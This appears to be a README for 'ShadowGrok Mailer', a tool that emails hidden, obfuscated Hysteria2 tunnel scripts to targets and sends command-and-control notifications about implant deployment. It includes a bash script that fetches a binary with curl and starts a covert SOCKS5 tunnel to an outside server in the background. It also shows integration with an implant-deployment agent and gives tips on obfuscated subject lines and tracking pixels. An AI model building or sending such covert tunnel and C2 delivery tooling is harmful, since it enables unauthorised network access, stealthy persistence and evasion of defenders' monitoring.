# ShadowGrok Mailer

Sends **hidden Hysteria2 tunnel scripts** and C2 notifications via email.

## Features

- Generates **one-click hidden tunnel scripts** (Bash + PowerShell) with:
  - Hysteria2 + QUIC + Obfuscation (xor / salamander)
  - Stealth levels (standard / high / maximum)
  - Auto-expiring configs (default 72h)
  - SOCKS5 proxy on 127.0.0.1:1080
- Sends professional HTML emails with inline scripts + attachments
- Logs all emails to Prisma (`EmailLog` model)
- Supports C2 event notifications (implant deployed, kill switch, OPSEC alerts)

## Setup

```bash
npm install nodemailer
# or
yarn add nodemailer
```

### Environment Variables

```env
SMTP_HOST=smtp.resend.com
SMTP_PORT=587
SMTP_USER=resend
RESEND_API_KEY=re_xxxxxxxx
MAIL_FROM="ShadowGrok" <tunnel@yourdomain.com>
```

## Usage

### Send Hidden Tunnel Script

```typescript
import { sendHiddenHysteriaTunnelScript } from '@/mailer';

await sendHiddenHysteriaTunnelScript({
  to: 'target@company.com',
  tunnelType: 'hysteria2-obfs',
  platform: 'all',
  stealthLevel: 'maximum',
  nodeId: 'node_abc123',
  expiresInHours: 48,
});
```

### Send C2 Notification

```typescript
import { sendC2Notification } from '@/mailer';

await sendC2Notification({
  to: 'operator@shadowgrok.local',
  type: 'implant_deployed',
  data: { implantId: 'imp_4821', nodeId: 'node_07' },
});
```

## Generated Script Example (Maximum Stealth)

```bash
#!/bin/bash
# ShadowGrok Hidden Hysteria2 Tunnel (Stealth: maximum)

curl -fsSL https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-amd64 -o /tmp/h2 && chmod +x /tmp/h2

cat > /tmp/h2.conf <<EOF
server: your-server.com:443
auth: shadowgrok-1714459200
obfs:
  type: salamander
  password: shadowgrok-1714459200
quic:
  congestion: bbr
  initialStreamReceiveWindow: 8388608
bandwidth:
  up: 100 mbps
  down: 100 mbps
EOF

/tmp/h2 client -c /tmp/h2.conf --log-level warn &
echo "Tunnel active on SOCKS5 127.0.0.1:1080 (expires in 72h)"
```

## Integration with ShadowGrok

After successful implant deployment via the agent runner, automatically send the tunnel script:

```typescript
// In tool-executor.ts after compileAndDeployImplant
if (result.success && result.data?.implant_id) {
  await sendHiddenHysteriaTunnelScript({
    to: operatorEmail,
    nodeId: args.node_id,
    stealthLevel: 'maximum',
  });
}
```

## Production Tips

- Use Resend, Postmark, or AWS SES for reliable delivery.
- Add DKIM/SPF for better inbox placement.
- Obfuscate the email subject line for sensitive deliveries.
- Track opens/clicks via tracking pixels (optional).

This mailer turns ShadowGrok into a complete **covert delivery + notification system** for red team operations.